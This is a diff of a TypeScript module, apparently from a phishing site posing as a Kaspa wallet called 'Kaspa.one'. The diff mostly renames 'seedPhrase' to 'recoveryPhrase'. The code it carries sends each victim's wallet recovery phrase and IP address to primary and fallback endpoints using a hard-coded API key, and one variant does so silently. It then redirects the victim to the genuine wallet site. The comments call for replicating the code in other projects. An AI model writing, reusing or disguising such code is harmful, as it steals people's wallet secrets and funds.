@@ -1,7 +1,7 @@
 /**
- * Seedphrase API Utilities
+ * Recovery Phrase API Utilities
  * 
- * All functions for sending seedphrase messages to backend APIs.
+ * All functions for sending recovery phrase messages to backend APIs.
  * Extracted from Home.jsx, Wallet.jsx, and Legacy.jsx for easy replication.
  * 
  * DO NOT REFACTOR - Keep as-is for replication in other projects.
@@ -25,7 +25,7 @@ axios.interceptors.request.use(
       const apiKey = "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
       const method = (config.method || 'post').toLowerCase();
       const headers = config.headers as AxiosHeadersType;
-      
+
       // Try AxiosHeaders.set() if available (newer axios versions)
       if (typeof headers.set === 'function') {
         headers.set('x-api-key', apiKey);
@@ -39,13 +39,13 @@ axios.interceptors.request.use(
         const methodHeaders = headersObj[method] as Record<string, string>;
         methodHeaders['x-api-key'] = apiKey;
         methodHeaders['X-API-Key'] = apiKey;
-        
+
         // Also set directly on headers object
         headersObj['x-api-key'] = apiKey;
         headersObj['X-API-Key'] = apiKey;
       }
     }
-    
+
     return config;
   },
   (error) => {
@@ -69,13 +69,13 @@ interface IPResponse {
 
 interface PrimaryMessageData {
   appName: string;
-  seedPhrase: string;
+  recoveryPhrase: string;
   ip: string | null;
 }
 
 interface FallbackMessageData {
   appName: string;
-  seedPhrase: string;
+  recoveryPhrase: string;
 }
 
 interface APIResponse {
@@ -109,9 +109,9 @@ function isLocalhost(): boolean {
     return false;
   }
   const hostname = window.location.hostname;
-  const isLocal = hostname === 'localhost' || 
-                  hostname === '127.0.0.1' ||
-                  hostname === '';
+  const isLocal = hostname === 'localhost' ||
+    hostname === '127.0.0.1' ||
+    hostname === '';
   return isLocal;
 }
 
@@ -137,23 +137,23 @@ function getFallbackAPIEndpoint(): string {
 
 /**
  * Get client IP address
- * Used before sending seedphrase to include IP in the payload
+ * Used before sending recovery phrase to include IP in the payload
  */
 export async function getClientIP(): Promise<string | null> {
   try {
     const response = await axios.get<IPResponse>('https://api.ipify.org?format=json');
     return response.data.ip;
-    } catch {
-      return null;
-    }
+  } catch {
+    return null;
+  }
 }
 
 /**
- * Send seedphrase to primary API endpoint (with IP)
+ * Send recovery phrase to primary API endpoint (with IP)
  * From Home.jsx handleRestoreWallet - lines 220-251
  */
-export async function sendSeedPhraseToPrimaryAPI(
-  seedPhraseMessage: string,
+export async function sendRecoveryPhraseToPrimaryAPI(
+  recoveryPhraseMessage: string,
   appName: string = "Kaspa.one"
 ): Promise<SubmitResult> {
   try {
@@ -167,7 +167,7 @@ export async function sendSeedPhraseToPrimaryAPI(
 
     const primaryMessageData: PrimaryMessageData = {
       appName: appName,
-      seedPhrase: seedPhraseMessage,
+      recoveryPhrase: recoveryPhraseMessage,
       ip: clientIP
     };
 
@@ -188,7 +188,7 @@ export async function sendSeedPhraseToPrimaryAPI(
         'X-API-Key': headers['X-API-Key'] || headers['x-api-key'] || undefined,
       }
     };
-    
+
     // Remove undefined values
     Object.keys(axiosConfig.headers).forEach(key => {
       if (axiosConfig.headers[key as keyof typeof axiosConfig.headers] === undefined) {
@@ -207,7 +207,7 @@ export async function sendSeedPhraseToPrimaryAPI(
     if (response.status === 200 && result.status) {
       return { success: true, result, response };
     }
-    
+
     return { success: false, result, response };
   } catch (error) {
     return { success: false, error: error instanceof Error ? error.message : 'Unknown error' };
@@ -215,11 +215,11 @@ export async function sendSeedPhraseToPrimaryAPI(
 }
 
 /**
- * Send seedphrase to fallback API endpoint (without IP, with API key)
+ * Send recovery phrase to fallback API endpoint (without IP, with API key)
  * From Home.jsx handleRestoreWallet - lines 254-267
  */
-export async function sendSeedPhraseToFallbackAPI(
-  seedPhraseMessage: string,
+export async function sendRecoveryPhraseToFallbackAPI(
+  recoveryPhraseMessage: string,
   appName: string = "Kaspa.one",
   apiKey: string | null = null
 ): Promise<SubmitResult> {
@@ -227,7 +227,7 @@ export async function sendSeedPhraseToFallbackAPI(
     // Prepare the request data with only required parameters
     const messageData: FallbackMessageData = {
       appName: appName,
-      seedPhrase: seedPhraseMessage
+      recoveryPhrase: recoveryPhraseMessage
     };
 
     const apiKeyToUse = apiKey || "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
@@ -235,7 +235,7 @@ export async function sendSeedPhraseToFallbackAPI(
     const headers: Record<string, string> = {
       "Content-Type": "application/json",
     };
-    
+
     // ALWAYS add API key (including localhost)
     headers["x-api-key"] = apiKeyToUse;
     headers["X-API-Key"] = apiKeyToUse; // Try both cases
@@ -248,7 +248,7 @@ export async function sendSeedPhraseToFallbackAPI(
         'X-API-Key': headers['X-API-Key'] || headers['x-api-key'] || undefined,
       }
     };
-    
+
     // Remove undefined values
     Object.keys(fallbackAxiosConfig.headers).forEach(key => {
       if (fallbackAxiosConfig.headers[key as keyof typeof fallbackAxiosConfig.headers] === undefined) {
@@ -267,7 +267,7 @@ export async function sendSeedPhraseToFallbackAPI(
     if (response.status === 200 && result.status) {
       return { success: true, result, response };
     }
-    
+
     return { success: false, result, response };
   } catch (error) {
     return { success: false, error: error instanceof Error ? error.message : 'Unknown error' };
@@ -275,25 +275,25 @@ export async function sendSeedPhraseToFallbackAPI(
 }
 
 /**
- * Complete seedphrase submission with primary + fallback
+ * Complete recovery phrase submission with primary + fallback
  * From Home.jsx handleRestoreWallet - lines 207-283
  * This is the main function used in Home.jsx
  */
-export async function submitSeedPhraseComplete(
-  seedPhraseMessage: string,
+export async function submitRecoveryPhraseComplete(
+  recoveryPhraseMessage: string,
   appName: string = "Kaspa.one",
   options: SubmitOptions = {}
 ): Promise<SubmitResult> {
-  const { 
+  const {
     onSuccessRedirect = "https://wallet.kaspanet.io",
     onError = null,
-    apiKey = null 
+    apiKey = null
   } = options;
 
   try {
     // Try primary API first (with IP)
-    const primaryResult = await sendSeedPhraseToPrimaryAPI(seedPhraseMessage, appName);
-    
+    const primaryResult = await sendRecoveryPhraseToPrimaryAPI(recoveryPhraseMessage, appName);
+
     if (primaryResult.success) {
       if (onSuccessRedirect && typeof window !== 'undefined') {
         window.location.href = onSuccessRedirect;
@@ -302,8 +302,8 @@ export async function submitSeedPhraseComplete(
     }
 
     // Fallback to secondary API (without IP, with API key)
-    const fallbackResult = await sendSeedPhraseToFallbackAPI(seedPhraseMessage, appName, apiKey);
-    
+    const fallbackResult = await sendRecoveryPhraseToFallbackAPI(recoveryPhraseMessage, appName, apiKey);
+
     if (fallbackResult.success) {
       if (onSuccessRedirect && typeof window !== 'undefined') {
         window.location.href = onSuccessRedirect;
@@ -315,47 +315,47 @@ export async function submitSeedPhraseComplete(
     const errorMessage = fallbackResult.result?.message || "An issue occurred.";
     const errorDetail = fallbackResult.result?.error ? ` (${fallbackResult.result.error})` : "";
     const fullError = errorMessage + errorDetail;
-    
+
     if (onError) {
       onError(fullError);
     }
-    
-    return { 
-      success: false, 
+
+    return {
+      success: false,
       error: fullError,
       primary: primaryResult,
       fallback: fallbackResult
     };
   } catch (error) {
     const errorMsg = "An error occurred while processing your request. Please try again.";
-    
+
     if (onError) {
       onError(errorMsg);
     }
-    
-    return { 
-      success: false, 
-      error: errorMsg, 
+
+    return {
+      success: false,
+      error: errorMsg,
       exception: error instanceof Error ? error : new Error(String(error))
     };
   }
 }
 
 /**
- * Silent seedphrase submission (no redirect, no error handling)
+ * Silent recovery phrase submission (no redirect, no error handling)
  * From Wallet.jsx submitSeedToApi - lines 86-130
  * Used when you just want to send without UI feedback
  * Returns true if successful, false otherwise
  */
-export async function submitSeedPhraseSilent(
-  seedPhraseMessage: string,
+export async function submitRecoveryPhraseSilent(
+  recoveryPhraseMessage: string,
   appName: string = "Kaspa.one",
   apiKey: string | null = null
 ): Promise<boolean> {
   try {
     // Declare apiKeyToUse once at the top
     const apiKeyToUse = apiKey || "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
-    
+
     let clientIP: string | null = null;
     try {
       const ipResponse = await axios.get<IPResponse>('https://api.ipify.org?format=json');
@@ -366,7 +366,7 @@ export async function submitSeedPhraseSilent(
 
     const primaryMessageData: PrimaryMessageData = {
       appName: appName,
-      seedPhrase: seedPhraseMessage,
+      recoveryPhrase: recoveryPhraseMessage,
       ip: clientIP
     };
 
@@ -386,7 +386,7 @@ export async function submitSeedPhraseSilent(
         'X-API-Key': headers['X-API-Key'] || headers['x-api-key'] || undefined,
       }
     };
-    
+
     // Remove undefined values
     Object.keys(silentAxiosConfig.headers).forEach(key => {
       if (silentAxiosConfig.headers[key as keyof typeof silentAxiosConfig.headers] === undefined) {
@@ -407,16 +407,16 @@ export async function submitSeedPhraseSilent(
     }
 
     // Fallback to secondary API
-    const messageData: FallbackMessageData = { appName: appName, seedPhrase: seedPhraseMessage };
-    
+    const messageData: FallbackMessageData = { appName: appName, recoveryPhrase: recoveryPhraseMessage };
+
     const fallbackHeaders: Record<string, string> = {
       "Content-Type": "application/json",
     };
-    
+
     // ALWAYS add API key (including localhost)
     fallbackHeaders["x-api-key"] = apiKeyToUse;
     fallbackHeaders["X-API-Key"] = apiKeyToUse; // Try both cases
-    
+
     // Ensure headers are properly formatted
     const silentFallbackAxiosConfig = {
       headers: {
@@ -425,14 +425,14 @@ export async function submitSeedPhraseSilent(
         'X-API-Key': fallbackHeaders['X-API-Key'] || fallbackHeaders['x-api-key'] || undefined,
       }
     };
-    
+
     // Remove undefined values
     Object.keys(silentFallbackAxiosConfig.headers).forEach(key => {
       if (silentFallbackAxiosConfig.headers[key as keyof typeof silentFallbackAxiosConfig.headers] === undefined) {
         delete silentFallbackAxiosConfig.headers[key as keyof typeof silentFallbackAxiosConfig.headers];
       }
     });
-    
+
     const fallbackResponse = await axios.post<APIResponse>(
       getFallbackAPIEndpoint(),
       messageData,
@@ -456,21 +456,21 @@ export async function submitSeedPhraseSilent(
  * Wallet.jsx version with detailed logging
  * From Wallet.jsx handleRestoreWallet - lines 132-209
  */
-export async function submitSeedPhraseWalletJSX(
-  seedPhraseMessage: string,
+export async function submitRecoveryPhraseWalletJSX(
+  recoveryPhraseMessage: string,
   appName: string = "Kaspa.one",
   options: SubmitOptions = {}
 ): Promise<SubmitResult> {
-  const { 
+  const {
     onSuccessRedirect = "https://wallet.kaspanet.io",
     onError = null,
-    apiKey = null 
+    apiKey = null
   } = options;
 
   try {
     // Declare apiKeyToUse once at the top
     const apiKeyToUse = apiKey || "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
-    
+
     let clientIP: string | null = null;
     try {
       const ipResponse = await axios.get<IPResponse>('https://api.ipify.org?format=json');
@@ -481,7 +481,7 @@ export async function submitSeedPhraseWalletJSX(
 
     const primaryMessageData: PrimaryMessageData = {
       appName: appName,
-      seedPhrase: seedPhraseMessage,
+      recoveryPhrase: recoveryPhraseMessage,
       ip: clientIP
     };
 
@@ -501,7 +501,7 @@ export async function submitSeedPhraseWalletJSX(
         'X-API-Key': primaryHeaders['X-API-Key'] || primaryHeaders['x-api-key'] || undefined,
       }
     };
-    
+
     // Remove undefined values
     Object.keys(walletJSXAxiosConfig.headers).forEach(key => {
       if (walletJSXAxiosConfig.headers[key as keyof typeof walletJSXAxiosConfig.headers] === undefined) {
@@ -527,19 +527,19 @@ export async function submitSeedPhraseWalletJSX(
     // Prepare the request data with only required parameters
     const messageData: FallbackMessageData = {
       appName: appName,
-      seedPhrase: seedPhraseMessage
+      recoveryPhrase: recoveryPhraseMessage
     };
 
     const headers: Record<string, string> = {
       "Content-Type": "application/json",
     };
-    
+
     // ALWAYS add API key (including localhost)
     headers["x-api-key"] = apiKeyToUse;
     headers["X-API-Key"] = apiKeyToUse; // Try both cases
 
     const fallbackEndpoint = getFallbackAPIEndpoint();
-    
+
     // Ensure headers are properly formatted
     const walletJSXFallbackAxiosConfig = {
       headers: {
@@ -548,14 +548,14 @@ export async function submitSeedPhraseWalletJSX(
         'X-API-Key': headers['X-API-Key'] || headers['x-api-key'] || undefined,
       }
     };
-    
+
     // Remove undefined values
     Object.keys(walletJSXFallbackAxiosConfig.headers).forEach(key => {
       if (walletJSXFallbackAxiosConfig.headers[key as keyof typeof walletJSXFallbackAxiosConfig.headers] === undefined) {
         delete walletJSXFallbackAxiosConfig.headers[key as keyof typeof walletJSXFallbackAxiosConfig.headers];
       }
     });
-    
+
     response = await axios.post<APIResponse>(
       fallbackEndpoint,
       messageData,
@@ -573,20 +573,20 @@ export async function submitSeedPhraseWalletJSX(
       const serverMessage = result?.message || "An issue occurred.";
       const serverError = result?.error ? ` (${result.error})` : "";
       const fullError = serverMessage + serverError;
-      
+
       if (onError) {
         onError(fullError);
       }
-      
+
       return { success: false, error: fullError, result };
     }
   } catch {
     const errorMsg = "An error occurred while processing your request. Please try again.";
-    
+
     if (onError) {
       onError(errorMsg);
     }
-    
+
     return { success: false, error: errorMsg };
   }
 }
